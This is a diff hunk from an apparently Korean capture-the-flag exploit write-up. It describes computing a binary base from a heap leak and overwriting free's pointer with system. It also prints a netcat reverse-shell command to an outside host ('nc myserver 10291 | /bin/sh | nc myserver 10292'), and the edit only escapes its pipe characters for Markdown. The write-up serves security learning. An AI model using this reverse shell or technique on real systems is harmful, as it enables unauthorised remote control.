@@ -30,7 +30,7 @@ index = 0 ~ 9
 
 heap_base와 binary base가 0x???000 정도 차이나는 것을 이용(차이는 컴퓨터마다 일정) 하여 \x7fELF가 나오는 부분을 찾아 binary base를 계산한다.
 
-이후 free의 pointer를 system으로 바꾸고, 힙에 "nc myserver 10291 | /bin/sh | nc myserver 10292" 처럼 reverse shell을 만든 후 free를 해주면 완성!
+이후 free의 pointer를 system으로 바꾸고, 힙에 "nc myserver 10291 &#124; /bin/sh &#124; nc myserver 10292" 처럼 reverse shell을 만든 후 free를 해주면 완성!
 
 ```python
 import pwnbox
